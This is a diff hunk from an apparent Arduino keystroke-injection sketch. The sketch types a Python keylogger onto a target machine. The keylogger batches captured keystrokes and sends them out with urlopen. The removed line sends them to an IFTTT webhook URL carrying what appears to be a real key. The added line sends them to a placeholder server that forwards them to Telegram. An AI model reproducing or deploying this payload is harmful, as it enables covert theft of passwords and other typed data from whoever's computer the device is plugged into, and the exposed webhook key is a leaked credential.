@@ -45,7 +45,7 @@ void setup() {
    Keyboard.write(KEY_RETURN);
    Keyboard.println("    if len(str(key))>3:");
    Keyboard.write(KEY_RETURN);
-   Keyboard.println("        ur.urlopen(\"https://maker.ifttt.com/trigger/logger/with/key/dgvnfqEFLZPCeq4j_YWlRD?value1=\"+s)");
+   Keyboard.println("        ur.urlopen(\"https://serverurl.com/sendtotelegram?value1=\"+s)");
    Keyboard.write(KEY_RETURN); //the previous url sends the text to ifttt to be forwarded to a telegram chat.
    Keyboard.println("        s=\"\"");
    Keyboard.write(KEY_RETURN);
